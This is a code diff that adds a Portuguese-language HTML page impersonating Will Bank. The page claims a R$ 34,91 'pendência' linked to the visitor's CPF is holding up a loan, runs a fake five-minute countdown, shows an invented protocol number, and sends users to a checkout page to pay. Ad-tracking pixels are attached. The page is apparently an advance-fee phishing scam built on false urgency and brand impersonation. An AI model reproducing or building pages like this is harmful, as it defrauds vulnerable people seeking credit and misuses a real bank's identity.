@@ -1,0 +1,190 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+     <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "simxqbeoht");
+</script>
+<script>
+  window.pixelId = "687678dbdbb2a8a13bab1d92";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    <title>Will Bank - Aviso Importante</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+      @import url("https://fonts.googleapis.com/css2?family=Inter:wght@100;200;300;400;500;600;700&display=swap");
+
+      body {
+        font-family: "Inter", sans-serif;
+      }
+      @keyframes pulse-scale {
+        0%,
+        100% {
+          box-shadow: 0 0 0 0 rgba(0, 0, 0, 0.7);
+        }
+        50% {
+          box-shadow: 0 0 0 12px rgba(0, 0, 0, 0);
+        }
+      }
+      .pulse-effect {
+        animation: pulse-scale 2.5s infinite;
+      }
+    </style>
+  </head>
+
+  <body class="bg-gray-50 min-h-screen">
+    <div class="mx-auto bg-white min-h-screen">
+      <!-- Header -->
+      <div
+        class="bg-[url('./images/header.png')] bg-cover bg-center bg-no-repeat h-[70px] w-full px-6 py-6"
+      ></div>
+
+      <div class="px-4 py-6 space-y-6 text-center">
+        <div class="flex items-center w-full justify-center">
+          <img src="/images/Component 1.png" class="w-[80%]" alt="" />
+        </div>
+
+        <div class="text-center space-y-6">
+          <div class="text-gray-800 text-2xl font-light leading-relaxed px-2">
+            Durante a verificação final do seu cadastro,
+            <span class="font-semibold"
+              >foi identificada uma pendência no valor de R$ 34,91</span
+            >
+            vinculada ao seu CPF.
+          </div>
+
+          <div class="flex justify-center py-4">
+            <image
+              src="/images/DM_20250718231600_001.png"
+              alt="Person jumping with joy"
+              width="300"
+              height="300"
+              class="object-contain"
+            />
+          </div>
+
+          <div class="text-gray-800 text-2xl font-light leading-relaxed px-2">
+            Para que o processo de liberação do empréstimo seja concluído com
+            sucesso, é
+            <span class="font-semibold"
+              >necessário regularizar essa pendência.</span
+            >
+          </div>
+        </div>
+      </div>
+      <!-- Conteúdo principal -->
+      <div class="px-6 py-6 space-y-6">
+        <!-- Botão principal -->
+        <div class="pt-4">
+          <button
+            class="w-full bg-black hover:bg-gray-800 text-yellow-400 font-semibold py-4 px-6 rounded-full text-lg transition-colors pulse-effect"
+            id="btnSaque"
+          >
+            Regularizar Pendência
+          </button>
+
+     
+
+          <script>
+  document.getElementById("btnSaque").onclick = function () {
+    const urlParams = new URLSearchParams(window.location.search);
+              
+                            
+            document.getElementById("btnSaque").disabled = true;
+
+    // Remove o value antigo da URL
+    urlParams.delete("value");
+
+    // Monta a nova URL com o novo value
+    urlParams.set("value", "34.91");
+
+    urlParams.set("upsell", "1");
+    urlParams.set("produto_id", "297");
+    // Redireciona
+    const destino = "/checkout/?" + urlParams.toString();
+    window.location.href = destino;
+  };
+</script><script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "silz60upc3");
+</script>
+        </div>
+
+        <!-- Box com timer -->
+        <div
+          class="border-2 border-yellow-400 rounded-lg p-4 px-9 bg-[#f8f8f8]"
+        >
+          <div class="text-center space-y-3">
+            <p class="text-black text-left font-light text-md">
+              O sistema reserva o crédito por tempo limitado: faltam
+              <span class="font-bold text-yellow-500" id="timer">05:00</span>
+              minutos.
+            </p>
+            <!-- Progress bar container -->
+            <div class="w-full h-2 bg-gray-300 rounded-lg overflow-hidden">
+              <div
+                class="h-full bg-yellow-400 progress-bar transition-all duration-500 ease-linear"
+                style="width: 0%"
+              ></div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Footer -->
+        <div class="bg-yellow-400 -mx-1.2 text-center my-4">
+          <p
+            class="text-black font-bold py-1 px-[12px]"
+            style="font-size: 11px"
+          >
+            WILL BANK - Central de Validação de Cadastro<br />
+            Protocolo: #WB-982114-BR
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <script>
+      let timeLeft = 300; // 7:59 em segundos
+      const totalTime = 300;
+      const timerElement = document.getElementById("timer");
+      const progressBar = document.querySelector(".progress-bar");
+
+      function updateTimer() {
+        const minutes = Math.floor(timeLeft / 60);
+        const seconds = timeLeft % 60;
+        timerElement.textContent = `${minutes
+          .toString()
+          .padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
+
+        const progressPercent = ((totalTime - timeLeft) / totalTime) * 100;
+        progressBar.style.width = `${progressPercent}%`;
+
+        if (timeLeft > 0) {
+          timeLeft--;
+        }
+      }
+
+      updateTimer(); // inicializa imediatamente
+      setInterval(updateTimer, 1000);
+    </script>
+  </body>
+</html>
